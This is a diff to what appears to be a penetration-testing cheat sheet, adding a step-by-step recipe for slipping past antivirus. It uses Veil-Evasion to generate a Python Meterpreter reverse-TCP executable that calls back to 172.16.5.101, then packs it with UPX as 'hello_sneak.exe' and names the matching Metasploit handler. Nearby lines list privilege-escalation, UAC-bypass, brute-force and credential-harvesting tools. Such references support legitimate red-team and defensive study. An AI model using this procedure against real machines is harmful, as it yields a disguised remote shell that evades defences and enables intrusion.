@@ -696,6 +696,57 @@ $ script -qc /bin/bash /dev/null
 		   ```
 	- [**PowerUp**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1): Poweshell module for privilege escalation, import it to Meterpreter using the Powershell module
 	- If you are not able to use the `getsystem` Meterpreter command to escalate maybe you need to bypass UAC. You can search for possible bypasses in Metasploit using the `post/multi/recon/local_exploit_suggester` module or use [UACME](https://github.com/hfiref0x/UACME)
+	- If an AV is in place, [Veil](https://github.com/Veil-Framework/Veil) alongside the [UPX](https://upx.github.io/) packer can be used to bypass it. First open Veil and generate a Meterpreter executable:
+      ```bash
+      ...
+      Veil>: use 1
+      ...
+	  Veil/Evasion>: use python/meterpreter/rev_tcp.py
+	  [python/meterpreter/rev_tcp>>]: set LHOST 172.16.5.101
+	  [python/meterpreter/rev_tcp>>]: generate
+	  ===============================================================================
+	                                     Veil-Evasion
+	  ===============================================================================
+	        [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
+	  ===============================================================================
+  
+  	   [>] Please enter the base name for output files (default is payload): hello
+  	  ===============================================================================
+	                                     Veil-Evasion
+	  ===============================================================================
+	        [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
+	  ===============================================================================
+
+	   [?] How would you like to create your payload executable?
+
+	       1 - PyInstaller (default)
+	       2 - Py2Exe
+
+	   [>] Please enter the number of your choice: 1
+	  ...
+	  ===============================================================================
+	                                   Veil-Evasion
+	  ===============================================================================
+	        [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
+	  ===============================================================================
+
+	   [*] Language: python
+	   [*] Payload Module: python/meterpreter/rev_tcp
+	   [*] Executable written to: /var/lib/veil/output/compiled/hello.exe
+	   [*] Source code written to: /var/lib/veil/output/source/hello.py
+	   [*] Metasploit Resource file written to: /var/lib/veil/output/handlers/hello.rc
+
+	  Hit enter to continue...
+      ```
+      Lastly, using UPX compress the executable:
+      ```bash
+      ┌──(rootkali)-[~]
+	  └─# mv /var/lib/veil/output/compiled/hello.exe hello_world.exe
+
+	  ┌──(rootkali)-[~]
+	  └─# upx --best --ultra-brute -o hello_sneak.exe hello_world.exe
+      ```
+     The payload that must be used in this case in the Metasploit handler would be windows/meterpreter/reverse_tcp
 - [**Armitage**](https://github.com/rsmudge/armitage)**:** GUI para metasploit
 - [**Hydra**](https://github.com/vanhauser-thc/thc-hydra)**:** Search for passwords by brute force through a protocol or web
 - [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher)**:** SessionGopher is a PowerShell tool that finds and decrypts saved session information for remote access tools
